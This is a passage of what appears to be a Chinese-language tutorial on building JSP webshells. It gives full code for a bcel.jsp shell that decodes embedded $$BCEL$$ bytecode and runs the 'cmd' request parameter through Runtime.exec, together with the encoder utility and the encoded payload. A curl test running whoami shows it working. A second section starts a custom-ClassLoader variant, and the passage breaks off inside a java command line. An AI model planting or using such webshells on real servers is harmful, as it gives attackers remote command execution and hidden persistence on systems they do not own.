<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URI uri = Util.class.getResource(<span class="string">&quot;Exp.class&quot;</span>).toURI();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(Paths.get(uri));</span><br><span class="line">        String bcel = Utility.encode(bytes, <span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span> + bcel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>$$BCEL$$</code>开头的字节码在被bcel类加载的时候会执行字节码。</p>
<p>运行Util.java</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$</span><span class="symbol">$</span>BCEL<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>l<span class="symbol">$</span><span class="number">8</span>b<span class="symbol">$</span>I<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span>A<span class="symbol">$</span><span class="number">85</span>S<span class="symbol">$</span>dbR<span class="symbol">$</span>TA<span class="symbol">$</span>Q<span class="symbol">$</span><span class="number">3</span>d<span class="symbol">$</span><span class="number">93</span>l2aY<span class="symbol">$</span>I<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span>A<span class="symbol">$</span>c1<span class="symbol">$</span>bbx<span class="symbol">$</span>n<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span><span class="number">84</span>xAQ<span class="symbol">$</span><span class="number">40</span>P<span class="symbol">$</span>Q<span class="symbol">$</span>U<span class="symbol">$</span>N<span class="symbol">$</span>c1<span class="symbol">$</span>C<span class="symbol">$</span>L<span class="symbol">$</span>w<span class="symbol">$</span><span class="number">8</span>f<span class="symbol">$</span>cbf<span class="symbol">$</span>c0<span class="symbol">$</span>c5d7<span class="symbol">$</span>b5<span class="symbol">$</span>d9X<span class="symbol">$</span>fc<span class="symbol">$</span><span class="number">91</span><span class="symbol">$</span>afZ<span class="symbol">$</span>a5<span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span>rU<span class="symbol">$</span><span class="number">3</span>e<span class="symbol">$</span>fa<span class="symbol">$</span>e0G<span class="symbol">$</span>f8<span class="symbol">$</span>B<span class="symbol">$</span><span class="number">7</span>e<span class="symbol">$</span><span class="number">83</span><span class="symbol">$</span>r<span class="symbol">$</span>f6l<span class="symbol">$</span>WB<span class="symbol">$</span><span class="number">8</span>aX<span class="symbol">$</span><span class="number">3</span>el<span class="symbol">$</span>cft<span class="symbol">$</span><span class="number">9</span>fN<span class="symbol">$</span>f7<span class="symbol">$</span>e9<span class="symbol">$</span><span class="number">93</span><span class="symbol">$</span><span class="number">9</span>e<span class="symbol">$</span>l<span class="symbol">$</span><span class="number">7</span>f<span class="symbol">$</span>be<span class="symbol">$</span><span class="number">7</span>e<span class="symbol">$</span>Dp<span class="symbol">$</span>Xy<span class="symbol">$</span>V<span class="symbol">$</span>fdHsdT<span class="symbol">$</span>E<span class="symbol">$</span><span class="number">90</span>V1<span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span>ac4<span class="symbol">$</span>b78ns<span class="symbol">$</span>dcQ<span class="symbol">$</span>vcJ<span class="symbol">$</span>F<span class="symbol">$</span>c7<span class="symbol">$</span><span class="number">3</span>d<span class="symbol">$</span>Va<span class="symbol">$</span>dc<span class="symbol">$</span><span class="number">97</span>fZ<span class="symbol">$</span>s<span class="symbol">$</span><span class="number">3</span>e<span class="symbol">$</span><span class="number">88</span><span class="symbol">$</span>e0<span class="symbol">$</span>a1<span class="symbol">$</span><span class="number">3</span>cg<span class="symbol">$</span>ba<span class="symbol">$</span>d0<span class="symbol">$</span><span class="number">87</span>Y<span class="symbol">$</span><span class="number">8e9</span><span class="symbol">$</span><span class="number">8</span>eG<span class="symbol">$</span>MAGT<span class="symbol">$</span>Zb<span class="symbol">$</span>b9<span class="symbol">$</span><span class="number">7</span>d<span class="symbol">$</span>fd<span class="symbol">$</span><span class="number">9</span>d<span class="symbol">$</span><span class="number">9</span>e<span class="symbol">$</span>z<span class="symbol">$</span>e9<span class="symbol">$</span>d6<span class="symbol">$</span><span class="number">5</span>ev<span class="symbol">$</span>d3uLko<span class="symbol">$</span><span class="number">96</span><span class="symbol">$</span>n<span class="symbol">$</span><span class="number">3</span>cgZ<span class="symbol">$</span>a6<span class="symbol">$</span><span class="number">3</span>b<span class="symbol">$</span>cf0<span class="symbol">$</span><span class="number">98</span><span class="symbol">$</span><span class="number">3</span>c<span class="symbol">$</span>L<span class="symbol">$</span><span class="number">8</span>fo1<span class="symbol">$</span>uKvQ0Ds<span class="symbol">$</span>a6<span class="symbol">$</span>r<span class="symbol">$</span>f2<span class="symbol">$</span>b5<span class="symbol">$</span>f2<span class="symbol">$</span><span class="number">8</span>ep<span class="symbol">$</span><span class="number">5</span>e<span class="symbol">$</span>eb<span class="symbol">$</span><span class="number">3</span>b<span class="symbol">$</span>r<span class="symbol">$</span>n<span class="symbol">$</span>cb<span class="symbol">$</span>d9<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span><span class="number">5</span>e<span class="symbol">$</span>da<span class="symbol">$</span>d2<span class="symbol">$</span>jS<span class="symbol">$</span>fa<span class="symbol">$</span><span class="number">7</span>ePq<span class="symbol">$</span>df<span class="symbol">$</span><span class="number">98</span><span class="symbol">$</span>d4<span class="symbol">$</span>w<span class="symbol">$</span><span class="number">94</span><span class="symbol">$</span><span class="number">5</span>b<span class="symbol">$</span><span class="number">3</span>e<span class="symbol">$</span>a8P<span class="symbol">$</span>f5<span class="symbol">$</span>a0Q<span class="symbol">$</span><span class="symbol">$</span><span class="number">2</span><span class="symbol">$</span>f4T<span class="symbol">$</span>bdr<span class="symbol">$</span><span class="number">8</span>b5<span class="symbol">$</span>b3T<span class="symbol">$</span>U<span class="symbol">$</span>O<span class="symbol">$</span>c3<span class="symbol">$</span>c8<span class="symbol">$</span><span class="number">99</span>N<span class="symbol">$</span><span class="number">3</span>e<span class="symbol">$</span>q<span class="symbol">$</span>f98B<span class="symbol">$</span>f7<span class="symbol">$</span><span class="number">92</span><span class="symbol">$</span>S<span class="symbol">$</span>cd<span class="symbol">$</span>q<span class="symbol">$</span>d3<span class="symbol">$</span>ce<span class="symbol">$</span><span class="symbol">$</span><span class="symbol">$</span>d6vw<span class="symbol">$</span><span class="number">85</span><span class="symbol">$</span>p<span class="symbol">$</span><span class="number">8</span>a<span class="symbol">$</span>h<span class="symbol">$</span>kB9J<span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span>b8P<span class="symbol">$</span>d9MW7<span class="symbol">$</span>de<span class="symbol">$</span>ae<span class="symbol">$</span>e9<span class="symbol">$</span>V<span class="symbol">$</span>af<span class="symbol">$</span>b77<span class="symbol">$</span>eb<span class="symbol">$</span><span class="number">3</span>c<span class="symbol">$</span>e9E<span class="symbol">$</span>C1<span class="symbol">$</span>a8<span class="symbol">$</span>cb<span class="symbol">$</span>H<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span>a8<span class="symbol">$</span>b8<span class="symbol">$</span>a6mU9<span class="symbol">$</span>W<span class="symbol">$</span>Y<span class="symbol">$</span>o<span class="symbol">$</span>ae<span class="symbol">$</span>dd<span class="symbol">$</span>ec<span class="symbol">$</span>c4<span class="symbol">$</span>QO<span class="symbol">$</span><span class="number">8</span>ew<span class="symbol">$</span>SB<span class="symbol">$</span>dd<span class="symbol">$</span>b4k<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span>nVL9F<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span>e8O<span class="symbol">$</span>ca<span class="symbol">$</span>q<span class="symbol">$</span>Nq<span class="symbol">$</span><span class="number">3</span>cf<span class="symbol">$</span>Y<span class="symbol">$</span>fe<span class="symbol">$</span>Ha<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span>t<span class="symbol">$</span>g<span class="symbol">$</span>W<span class="symbol">$</span>b1<span class="symbol">$</span>a4<span class="symbol">$</span>e1<span class="symbol">$</span>v<span class="symbol">$</span><span class="number">96</span><span class="symbol">$</span>Z<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span><span class="number">3</span>aS<span class="symbol">$</span>a6<span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span><span class="number">8</span>f<span class="symbol">$</span><span class="number">81</span>U<span class="symbol">$</span>abRs<span class="symbol">$</span>a9<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span>d0<span class="symbol">$</span>cbM<span class="symbol">$</span><span class="number">8</span>ccE<span class="symbol">$</span>c33<span class="symbol">$</span><span class="number">3</span>c<span class="symbol">$</span><span class="number">97</span><span class="symbol">$</span><span class="number">8</span>dV<span class="symbol">$</span>a5y<span class="symbol">$</span>a1<span class="symbol">$</span>e1<span class="symbol">$</span>r<span class="symbol">$</span>c65<span class="symbol">$</span>e4<span class="symbol">$</span>b0<span class="symbol">$</span>c6<span class="symbol">$</span>c0T<span class="symbol">$</span>NI<span class="symbol">$</span>e9<span class="symbol">$</span>c50<span class="symbol">$</span><span class="number">40</span>j<span class="symbol">$</span>S<span class="symbol">$</span>x<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span>be<span class="symbol">$</span>W<span class="symbol">$</span><span class="number">97</span><span class="symbol">$</span>f5<span class="symbol">$</span><span class="number">9</span>d<span class="symbol">$</span><span class="number">7</span>da<span class="symbol">$</span>b8m<span class="symbol">$</span>a1<span class="symbol">$</span>e3<span class="symbol">$</span>v<span class="symbol">$</span>HZ<span class="symbol">$</span>a1<span class="symbol">$</span>T<span class="symbol">$</span>v<span class="symbol">$</span>a8BR<span class="symbol">$</span>fe<span class="symbol">$</span>a5<span class="symbol">$</span>fd<span class="symbol">$</span>zl<span class="symbol">$</span>a3f<span class="symbol">$</span>b9f<span class="symbol">$</span><span class="number">99</span><span class="symbol">$</span>sV<span class="symbol">$</span>f7<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span><span class="number">7</span>b<span class="symbol">$</span>e2<span class="symbol">$</span>M<span class="symbol">$</span>b6I<span class="symbol">$</span>e4<span class="symbol">$</span><span class="number">87</span><span class="symbol">$</span>a5<span class="symbol">$</span>f0<span class="symbol">$</span>e2<span class="symbol">$</span><span class="number">40</span><span class="symbol">$</span>Y<span class="symbol">$</span>Mc<span class="symbol">$</span><span class="number">9</span>dV<span class="symbol">$</span>e5T<span class="symbol">$</span>e8<span class="symbol">$</span><span class="number">95</span>c<span class="symbol">$</span>h<span class="symbol">$</span>a2Z<span class="symbol">$</span><span class="number">9</span>dm<span class="symbol">$</span>eb<span class="symbol">$</span>e4<span class="symbol">$</span>H<span class="symbol">$</span>Zz<span class="symbol">$</span>a9<span class="symbol">$</span>d3<span class="symbol">$</span>v<span class="symbol">$</span>ZH<span class="symbol">$</span>dc<span class="symbol">$</span>e3n<span class="symbol">$</span>ed<span class="symbol">$</span>fa<span class="symbol">$</span>d0<span class="symbol">$</span>cf<span class="symbol">$</span>T<span class="symbol">$</span>c9<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span><span class="number">80</span><span class="symbol">$</span><span class="number">9</span>ca<span class="symbol">$</span>a0<span class="symbol">$</span>F<span class="symbol">$</span>f9<span class="symbol">$</span><span class="number">7</span>b<span class="symbol">$</span>n<span class="symbol">$</span>a3<span class="symbol">$</span>R<span class="symbol">$</span>b9<span class="symbol">$</span><span class="number">3</span>d9o<span class="symbol">$</span><span class="number">3</span>b<span class="symbol">$</span>c2z<span class="symbol">$</span>a5<span class="symbol">$</span>o<span class="symbol">$</span>y<span class="symbol">$</span>da<span class="symbol">$</span>be<span class="symbol">$</span>cc<span class="symbol">$</span><span class="number">7</span>f<span class="symbol">$</span>d8<span class="symbol">$</span>b6o<span class="symbol">$</span>m<span class="symbol">$</span>ae<span class="symbol">$</span>d2<span class="symbol">$</span>c3<span class="symbol">$</span>e9<span class="symbol">$</span>a7<span class="symbol">$</span>X<span class="symbol">$</span>c8<span class="symbol">$</span>e8<span class="symbol">$</span>p<span class="symbol">$</span>d5<span class="symbol">$</span>c9<span class="symbol">$</span>G<span class="symbol">$</span>e8<span class="symbol">$</span>k<span class="symbol">$</span>c7<span class="symbol">$</span>m<span class="symbol">$</span><span class="number">9</span>dC<span class="symbol">$</span>e4<span class="symbol">$</span>fd<span class="symbol">$</span>a4<span class="symbol">$</span>a7<span class="symbol">$</span>W<span class="symbol">$</span>a2s<span class="symbol">$</span><span class="number">3</span>d<span class="symbol">$</span>d5<span class="symbol">$</span>A<span class="symbol">$</span><span class="number">3</span>bD<span class="symbol">$</span>a0<span class="symbol">$</span>d0<span class="symbol">$</span><span class="number">40</span>p<span class="symbol">$</span>ed<span class="symbol">$</span>L<span class="symbol">$</span><span class="number">94</span><span class="symbol">$</span><span class="number">89</span><span class="symbol">$</span><span class="number">3</span>aB<span class="symbol">$</span>db<span class="symbol">$</span><span class="number">87</span><span class="symbol">$</span>I<span class="symbol">$</span>X<span class="symbol">$</span>O<span class="symbol">$</span>c1<span class="symbol">$</span>L<span class="symbol">$</span>be_G<span class="symbol">$</span>a4<span class="symbol">$</span><span class="number">81</span><span class="symbol">$</span>ae<span class="symbol">$</span>G<span class="symbol">$</span>d4<span class="symbol">$</span><span class="number">7</span>c<span class="symbol">$</span>a6<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span>ee<span class="symbol">$</span>c2<span class="symbol">$</span><span class="number">8</span>c<span class="symbol">$</span>f2<span class="symbol">$</span>j<span class="symbol">$</span>b1<span class="symbol">$</span>f4<span class="symbol">$</span><span class="number">88</span>R<span class="symbol">$</span><span class="number">87</span><span class="symbol">$</span>W<span class="symbol">$</span>eb<span class="symbol">$</span>n<span class="symbol">$</span>b3<span class="symbol">$</span>fd<span class="symbol">$</span>fe<span class="symbol">$</span>e8W<span class="symbol">$</span>w<span class="symbol">$</span><span class="number">5</span>dG<span class="symbol">$</span>efgD<span class="symbol">$</span><span class="number">3</span>fR<span class="symbol">$</span>c9<span class="symbol">$</span>m<span class="symbol">$</span><span class="number">86</span><span class="symbol">$</span>c9<span class="symbol">$</span><span class="number">8</span>e<span class="symbol">$</span>oB6<span class="symbol">$</span>M<span class="symbol">$</span><span class="number">85</span><span class="symbol">$</span><span class="number">5</span>e<span class="symbol">$</span>b7F<span class="symbol">$</span>f78<span class="symbol">$</span>ba<span class="symbol">$</span><span class="number">90</span>A7<span class="symbol">$</span>a6<span class="symbol">$</span>c9<span class="symbol">$</span><span class="number">5</span>bA<span class="symbol">$</span>_<span class="symbol">$</span>f2<span class="symbol">$</span><span class="number">88</span><span class="symbol">$</span>oA<span class="symbol">$</span>ZSM<span class="symbol">$</span>g<span class="symbol">$</span>Y<span class="symbol">$</span>c19<span class="symbol">$</span>c0<span class="symbol">$</span>bb<span class="symbol">$</span><span class="number">9</span>d<span class="symbol">$</span>t<span class="symbol">$</span>ba<span class="symbol">$</span><span class="number">8</span>c<span class="symbol">$</span>b2<span class="symbol">$</span><span class="number">96</span>p<span class="symbol">$</span>B<span class="symbol">$</span>X<span class="symbol">$</span><span class="number">89</span>n<span class="symbol">$</span><span class="number">86</span>j<span class="symbol">$</span><span class="number">5</span>d<span class="symbol">$</span>c2e<span class="symbol">$</span>aa<span class="symbol">$</span><span class="number">3</span>bE<span class="symbol">$</span>d8<span class="symbol">$</span>VB<span class="symbol">$</span>V<span class="symbol">$</span>g<span class="symbol">$</span>Pt<span class="symbol">$</span>P<span class="symbol">$</span>i<span class="symbol">$</span>R<span class="symbol">$</span>a8p<span class="symbol">$</span><span class="number">8</span>cr<span class="symbol">$</span><span class="number">5</span>c<span class="symbol">$</span>e3<span class="symbol">$</span>b8<span class="symbol">$</span>ceq<span class="symbol">$</span>D<span class="symbol">$</span>f8<span class="symbol">$</span><span class="number">8</span>d<span class="symbol">$</span>Ey<span class="symbol">$</span>b8I<span class="symbol">$</span>J<span class="symbol">$</span>K<span class="symbol">$</span><span class="number">95</span><span class="symbol">$</span>Z<span class="symbol">$</span>a3<span class="symbol">$</span><span class="number">8</span>fV<span class="symbol">$</span><span class="number">8</span>f<span class="symbol">$</span>ac<span class="symbol">$</span><span class="number">9</span>c<span class="symbol">$</span><span class="number">3</span>aK<span class="symbol">$</span>a7T<span class="symbol">$</span>q<span class="symbol">$</span><span class="number">94</span><span class="symbol">$</span>fa<span class="symbol">$</span><span class="number">84</span><span class="symbol">$</span>e8<span class="symbol">$</span>HO<span class="symbol">$</span><span class="number">94</span>a<span class="symbol">$</span><span class="number">8</span>feS<span class="symbol">$</span>s<span class="symbol">$</span>c9Gk<span class="symbol">$</span>s<span class="symbol">$</span>f8<span class="symbol">$</span><span class="number">7</span>c<span class="symbol">$</span>YR<span class="symbol">$</span><span class="number">5</span>e<span class="symbol">$</span>d6<span class="symbol">$</span>c4_<span class="symbol">$</span>L<span class="symbol">$</span>ea<span class="symbol">$</span><span class="number">8</span>b<span class="symbol">$</span><span class="number">87</span><span class="symbol">$</span>d1<span class="symbol">$</span>E<span class="symbol">$</span>A<span class="symbol">$</span>A</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将运行的结果插入jsp</p>
<p>bcel.jsp</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    String bcel = <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbR$TA$Q$3d$93l2aY$I$84$A$c1$bbx$n$84$84xAQ$40P$Q$U$N$c1$C$L$w$8f$cbf$c0$c5d7$b5$d9X$fc$91$afZ$a5$89$rU$3e$fa$e0G$f8$B$7e$83$r$f6l$WB$8aX$3el$cft$9fN$f7$e9$93$9e$l$7f$be$7e$Dp$Xy$V$fdHsdT$E$90V1$89$ac4$b78ns$dcQ$vcJ$F$c7$3d$Va$dc$97fZ$s$3e$88$e0$a1$3cg$ba$d0$87Y$8e9$8eG$MAGT$Zb$b9$7d$fd$9d$9e$z$e9$d6$5ev$d3uLko$96$n$3cgZ$a6$3b$cf0$98$3c$L$8fo1$uKvQ0Ds$a6$r$f2$b5$f2$8ep$5e$eb$3b$r$n$cb$d9$86$5e$da$d2$jS$fa$7ePq$df$98$d4$w$94$5b$3e$a8P$f5$a0Q$$2$f4T$bdr$8b5$b3T$U$O$c3$c8$99N$3e$q$f98B$f7$92$S$cd$q$d3$ce$$$d6vw$85$p$8a$h$kB9J$89$b8P$d9MW7$de$ae$e9$V$af$b77$eb$3c$e9E$C1$a8$cb$H$86$a8$b8$a6mU9$W$Y$o$ae$dd$ec$c4$QO$8ew$SB$dd$b4k$8e$nVL9F$84$e8O$ca$q$Nq$3cf$Y$fe$Ha$8e$t$g$W$b1$a4$e1$v$96$Z$86$3aS$a6$89$8f$81U$abRs$a9$84$d0$cbM$8ccE$c33$3c$97$8dV$a5y$a1$e1$r$c65$e4$b0$c6$c0T$NI$e9$c50$40j$S$x$86$be$W$97$f5$9d$7da$b8m$a1$e3$v$HZ$a1$T$v$a8BR$fe$a5$fd$zl$a3f$b9f$99$sV$f7$84$7b$e2$M$b6I$e4$87$a5$f0$e2$40$Y$Mc$9dV$e5T$e8$95c$h$a2Z$9dm$eb$e4$H$Zz$a9$d3$v$ZH$dc$e3n$ed$fa$d0$cf$T$c9$8e$80$9ca$a0$F$f9$7b$n$a3$R$b9$3d9o$3b$c2z$a5$o$y$da$be$cc$7f$d8$b6o$m$ae$d2$c3$e9$a7$X$c8$e8$p$d5$c9$G$e8$k$c7$m$9dC$e4$fd$a4$a7$W$a2s$3d$d5$A$3bD$a0$d0$40p$ed$L$94$89$3aB$db$87$I$X$O$c1$L$be_G$a4$81$ae$G$d4$7c$a6$8e$ee$c2$8c$f2$j$b1$f4$88R$87$W$eb$n$b3$fd$fe$e8W$w$5dG$efgD$3fR$c9$m$86$c9$8e$oB6$M$85$5e$b7F$f78$ba$90A7$a6$c9$5bA$_$f2$88$oA$ZSM$g$Y$c19$c0$bb$9d$t$ba$8c$b2$96p$B$X$89n$86j$5d$c2e$aa$3bE$d8$VB$V$g$Pt$P$i$R$a8p$8cr$5c$e3$b8$ceq$D$f8$8d$Ey$b8I$J$K$95$Z$a3$8fV$8f$ac$9c$3aK$a7T$q$94$fa$84$e8$HO$94a$8feS$s$c9Gk$s$f8$7c$YR$5e$d6$c4_$L$ea$8b$87$d1$E$A$A&quot;</span>;</span><br><span class="line">    Class&lt;?&gt; _loader = Class.forName(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">    ClassLoader loader = (ClassLoader) _loader.newInstance();</span><br><span class="line">    Class&lt;?&gt; _obj = loader.loadClass(bcel);</span><br><span class="line">    Constructor&lt;?&gt; constructor = _obj.getConstructor(String.class);</span><br><span class="line">    Object obj = constructor.newInstance(cmd);</span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    response.getWriter().print(obj.toString());</span><br><span class="line">    response.getWriter().print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">[shadowflow<span class="meta">@ShadowOS</span> /tmp]% curl http:<span class="comment">//localhost:8080/jspshell_war/bcel.jsp?cmd=whoami</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>shadowflow</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>执行成功</p>
<h2 id="8-自定义ClassLoader"><a href="#8-自定义ClassLoader" class="headerlink" title="8. 自定义ClassLoader"></a>8. 自定义ClassLoader</h2><p>自定义ClassLoader的方式和BCEL的方式是类似的，只是BCEL是转换成BCEL字节码，而ClassLoader是转为真正的字节码</p>
<p>exp.java不变</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line=reader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stringBuilder.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">this</span>.res = stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Util.java，将Exp转为字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URI uri = Util.class.getResource(<span class="string">&quot;Exp.class&quot;</span>).toURI();</span><br><span class="line">        <span class="keyword">byte</span>[] codeBytes = Files.readAllBytes(Paths.get(uri));</span><br><span class="line">        String base = Base64.getEncoder().encodeToString(codeBytes);</span><br><span class="line">        System.out.println(base);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/bin/</span>java -javaagent:<span class="regexp">/Applications/</span>IntelliJ IDEA.app<span class="regexp">/Contents/</span>lib<span class="regexp">/idea_rt.jar=63386:/</span>Applications<span class="regexp">/IntelliJ IDEA.app/</span>Contents<span class="regexp">/bin -Dfile.encoding=UTF-8 -classpath /</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>charsets.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/deploy.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/cldrdata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/dnsns.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jaccess.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jfxrt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/localedata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/nashorn.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunec.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunjce_provider.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunpkcs11.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/zipfs.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>javaws.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_101.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jce.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_101.jdk/</span>Contents<span 